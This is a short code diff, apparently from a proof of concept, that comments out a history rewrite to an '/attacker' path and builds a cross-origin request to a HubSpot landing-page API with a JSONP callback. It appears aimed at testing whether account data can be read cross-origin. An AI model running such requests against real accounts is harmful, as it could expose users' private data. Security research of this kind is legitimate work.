@@ -1,4 +1,4 @@
-window.history.replaceState(null, '', '/attacker');
+//window.history.replaceState(null, '', '/attacker');
 var xhr = new XMLHttpRequest();
 
 xhr.open("GET", "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/45875820775/actions?portalId=25502480&callback=jsonpHandler", true);
